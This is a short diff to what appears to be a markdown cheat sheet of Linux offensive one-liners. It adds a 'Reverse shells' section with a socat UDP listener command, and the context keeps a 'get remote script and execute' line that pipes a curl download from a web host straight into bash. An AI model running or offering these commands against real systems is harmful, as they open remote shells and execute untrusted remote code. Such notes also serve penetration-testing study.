@@ -10,6 +10,10 @@
 
 # Linux
 
+## Reverse shells
+
+* `socat file:’tty’,echo=0,raw udp-listen:4444`
+
 ## Get remote script and execute
 
 `bash <(curl -s http://mywebsite.com/myscript.txt)`
